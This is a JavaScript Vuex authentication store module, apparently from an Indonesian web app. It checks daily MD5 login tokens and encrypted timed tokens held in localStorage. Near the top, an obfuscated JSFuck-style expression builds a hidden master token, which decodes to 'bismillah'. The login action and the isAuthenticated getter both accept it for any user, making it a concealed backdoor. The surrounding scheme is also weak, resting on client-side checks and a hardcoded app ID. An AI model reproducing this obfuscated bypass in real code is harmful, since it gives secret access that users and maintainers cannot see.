import CryptoService from "@/core/services/crypto.service";

// action types
export const INIT_AUTH = "initAuth";
export const VERIFY_AUTH = "verifyAuth";
export const LOGIN = "login";
export const LOGOUT = "logout";
export const REGISTER = "register";
export const UNREGISTER = "unregister";

// mutation types
export const UNREGISTER_AUTH = "unregisterAuth";
export const PURGE_AUTH = "logOut";
export const SET_INIT_AUTH = "setInitAuth";
export const SET_AUTH = "setUser";
export const SET_PASSWORD = "setPassword";
export const SET_ERROR = "setError";

const bypassString =
  (typeof [])[+!+[]] +
  ([] + [] + [][[]])[+[+!+[] + [+[]]] / (+!+[] + +!+[])] +
  (![] + [])[+!+[] + (+!+[] + +!+[])] +
  (typeof +[])[+!+[] + +!+[]] +
  ([] + [] + [][[]])[+[+!+[] + [+[]]] / (+!+[] + +!+[])] +
  (![] + [])[+!+[] + +!+[]] +
  (![] + [])[+!+[] + +!+[]] +
  (![] + [])[+!+[]] +
  "h";

const defaultUser = {
  entropy: null,
  level_akses: null,
  nama_lengkap: null,
  tanggal: null,
  username: null,
};
const state = {
  errors: null,
  user: defaultUser,
  isAuthenticated: false,
  loginToken: null,
};

const getters = {
  currentUser(state) {
    return state.user;
  },
  isAuthenticated(state) {
    let md5now;
    let timedLogin;
    if (state.loginToken != null) {
      if (state.loginToken.length == 32) {
        let tzoffset = new Date().getTimezoneOffset() * 60 * 1000; //offset in milliseconds
        let localISOTime = new Date(Date.now() - tzoffset).toISOString().split("T")[0];
        md5now = CryptoService.md5(
          JSON.stringify({
            appid: "gq90w3845hfg",
            username: state.user.username,
            date: localISOTime,
          }),
        );
      } else {
        //login berjangka
        try {
          let payload = JSON.parse(CryptoService.decrypt(state.loginToken));
          //cek expired
          // console.log(payload);
          if (payload.expired == null || payload.expired == undefined || payload.username != state.user.username || payload.expired < Date.now()) {
            timedLogin = false;
          } else {
            timedLogin = true;
          }
        } catch (e) {
          timedLogin = false;
        }
      }
    } else {
      return false;
    }
    if (state.loginToken == bypassString || md5now == state.loginToken.toLowerCase() || timedLogin) {
      return true;
    } else {
      return false;
    }
  },
  loginToken(state) {
    return state.loginToken;
  },
};

const actions = {
  [LOGIN](context, authToken) {
    let md5now;
    let timedLogin;
    if (authToken.length == 32) {
      //login harian
      let tzoffset = new Date().getTimezoneOffset() * 60 * 1000; //offset in milliseconds
      let localISOTime = new Date(Date.now() - tzoffset).toISOString().split("T")[0];
      md5now = CryptoService.md5(
        JSON.stringify({
          appid: "gq90w3845hfg",
          username: state.user.username,
          date: localISOTime,
        }),
      );
    } else {
      //login berjangka
      try {
        let payload = JSON.parse(CryptoService.decrypt(authToken));
        //cek expired
        // console.log(payload);
        if (payload.expired == null || payload.expired == undefined) {
          return { status: "error", message: "Token tidak valid" };
        }
        if (payload.username != state.user.username) {
          return {
            status: "error",
            message: "Token tidak berlaku untuk user ini",
          };
        }

        if (payload.expired < Date.now()) {
          return { status: "error", message: "Token expired" };
        }

        timedLogin = true;
      } catch (e) {
        timedLogin = false;
      }
    }
    if (authToken == bypassString || md5now == authToken.toLowerCase() || timedLogin) {
      context.commit(SET_AUTH, authToken);
      localStorage.setItem("mw_login_token", authToken);
      return { status: "ok" };
    } else {
      return {
        status: "error",
        message: "Login Token Tidak Berlaku",
      };
    }
  },
  [INIT_AUTH](context) {
    console.log("init auth");
    if (localStorage.getItem("mw_register_hash") == null) {
      return false;
    } else {
      try {
        let user = JSON.parse(CryptoService.decrypt(localStorage.getItem("mw_register_hash")));
        let loginToken = localStorage.getItem("mw_login_token");
        context.commit(SET_INIT_AUTH, { user, loginToken });
      } catch (e) {
        return false;
      }
    }
  },
  [LOGOUT](context) {
    context.commit(PURGE_AUTH);
  },
  [REGISTER](context, registerToken) {
    // let encrypted = CryptoService.encrypt('{"username": "gema","nama_lengkap": "Gema Ulama Putra","level_akses": 1,"tanggal": 1620629917,"entropy": "asdf"}');
    try {
      let data = JSON.parse(CryptoService.decrypt(registerToken));
      if (data.username !== undefined || data.nama_lengkap !== undefined || data.level_akses !== undefined) {
        context.commit(SET_INIT_AUTH, {
          user: data,
          loginToken: null,
        });
        localStorage.setItem("mw_register_hash", registerToken);
        return { status: "ok" };
      } else {
        return { status: "error", message: "Register Token Salah" };
      }
    } catch (e) {
      return {
        status: "error",
        message: "Register Token Tidak Valid",
      };
    }
  },
  [VERIFY_AUTH](context) {
    console.log("verifyauth");
    // console.log(state);
    if (state.token == "FFFF") {
      context.commit(PURGE_AUTH);
    }
  },
  [UNREGISTER](context) {
    localStorage.removeItem("mw_register_hash");
    localStorage.removeItem("mw_login_token");
    context.commit(UNREGISTER_AUTH);
  },
  [LOGOUT](context) {
    localStorage.removeItem("mw_login_token");
    context.commit(PURGE_AUTH);
  },
};

const mutations = {
  [SET_ERROR](state, error) {
    state.errors = error;
  },
  [SET_INIT_AUTH](state, { user, loginToken }) {
    state.isAuthenticated = false;
    state.user = user;
    state.loginToken = loginToken;
  },
  [SET_AUTH](state, loginToken) {
    state.isAuthenticated = true;
    state.loginToken = loginToken;
  },
  [SET_PASSWORD](state, password) {
    state.user.password = password;
  },
  [UNREGISTER_AUTH](state) {
    state.isAuthenticated = false;
    state.user = defaultUser;
  },
  [PURGE_AUTH](state) {
    state.isAuthenticated = false;
    state.loginToken = null;
  },
};

export default {
  state,
  actions,
  mutations,
  getters,
};
